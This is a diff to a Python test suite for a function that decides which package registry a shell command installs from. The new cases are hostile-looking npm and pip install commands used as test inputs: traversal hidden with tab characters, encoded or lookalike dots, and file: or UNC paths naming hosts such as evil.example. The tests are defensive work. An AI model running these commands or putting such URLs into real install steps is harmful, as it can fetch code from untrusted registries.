@@ -345,6 +345,8 @@ class RegistryTargetTests(unittest.TestCase):
                         "twine upload --repository-url 'https://registry.example.org/evil/.\n./simple/' dist/*",
                         "poetry source add foo 'https://registry.example.org/evil/.\t./simple'",
                         "npm install --registry 'https://registry.example.org/sim\tple' x",
+                        # Right after the path's first `/`: npm reads /../evil, which is /evil.
+                        "npm install --registry 'https://registry.example.org/\t../evil' x",
                         "npm install --registry 'https://registry.example.org/simple?x=\ty' x",
                         # Any other control character in a segment too.
                         "npm install --registry 'https://registry.example.org/simple/.\x0b./x' y"):
@@ -377,8 +379,12 @@ class RegistryTargetTests(unittest.TestCase):
             "https://registry.example.org/approved/%2e%2e%2e/evil/simple": "registry.example.org",
             "https://registry.example.org/approved/.. /evil/simple": "registry.example.org",
             "https://registry.example.org/approved/.../evil/simple": "registry.example.org",
-            # Only ASCII letters are lowercased: KELVIN SIGN (U+212A) is not `k`.
-            "https://registry.example.org/appro%E2%84%AAved/simple": "registry.example.org/appro\u212aved/simple",
+            # A character outside ASCII, decoded or not: KELVIN SIGN (U+212A) is not `k`, and FULLWIDTH FULL STOP (U+FF0E)
+            # and ONE DOT LEADER (U+2024) may be normalized to `.` by a server.
+            "https://registry.example.org/appro%E2%84%AAved/simple": "registry.example.org",
+            "https://registry.example.org/approved/%EF%BC%8E%EF%BC%8E/evil/simple": "registry.example.org",
+            "https://registry.example.org/approved/\u2024\u2024/evil/simple": "registry.example.org",
+            "https://registry.example.org/approved/\uff0e\uff0e/evil/simple": "registry.example.org",
         }
         for url, name in cases.items():
             with self.subTest(url=url):
@@ -449,9 +455,19 @@ class RegistryTargetTests(unittest.TestCase):
     def test_a_network_path_reference_or_unc_share_is_unknown(self):
         # A URL parser's base decides its host; for find-links on Windows, //server/share and \\server\share are shares.
         for command in ("npm install --registry //evil.example/simple x", "pip install -f //server/wheels x",
-                        "pip install -f '\\\\server\\wheels' x", "PIP_FIND_LINKS=//server/wheels pip install x"):
+                        "pip install -f '\\\\server\\wheels' x", "PIP_FIND_LINKS=//server/wheels pip install x",
+                        # Two separators in any mix, and a file: URL that names a host or a share.
+                        "pip install -f '\\/evil.example.org/w' x", "pip install -f '/\\evil.example.org\\w' x",
+                        "pip install -f file://evil.example.org/w x", "pip install -f file:////evil.example.org/w x",
+                        "pip install -i file://evil.example.org/simple x", "pip install -f 'file:\\\\evil\\w' x",
+                        "pip install -f 'file:///\\evil\\w' x"):
             with self.subTest(command=command):
                 self.assertEqual(targets(command), [(UNKNOWN, None)])
+        # A local file names no registry.
+        for command in ("pip install -f file:///srv/wheels x", "pip install -f file://localhost/srv/wheels x",
+                        "pip install -f file:/srv/wheels x", "pip install -i file:///srv/simple x", "pip install -f /opt/wheels x"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [])
 
     # Third review of PR #135 (26c23c0).
 
@@ -465,7 +481,15 @@ class RegistryTargetTests(unittest.TestCase):
                         "uv run --frozen --no-sync --locked --isolated --offline --no-project --active pytest",
                         "uv run --frozen --no-sync --all-extras --no-dev --exact --compile-bytecode --refresh pytest -q",
                         "uvx --isolated --offline --no-cache --quiet --refresh --reinstall --upgrade ruff check",
-                        "poetry --no-ansi run pytest -i x", "pipenv run --system pytest -f x"):
+                        "poetry --no-ansi run pytest -i x", "pipenv run --system pytest -f x",
+                        # Eight known long flags after the verb: as unknown options they would exhaust the readings
+                        # (four value readings in a row) and leave the command unsure, which is unknown.
+                        "poetry run --no-ansi --no-cache --no-plugins --no-interaction --quiet --verbose --no-ansi "
+                        "--no-cache pytest -i x",
+                        "pipenv run --system --verbose --quiet --clear --site-packages --system --verbose --quiet "
+                        "pytest -f x",
+                        "bundle exec --keep-file-descriptors --verbose --no-color --keep-file-descriptors --verbose "
+                        "--no-color --keep-file-descriptors --verbose rake -i x"):
             with self.subTest(command=command):
                 self.assertEqual(targets(command), [])
 
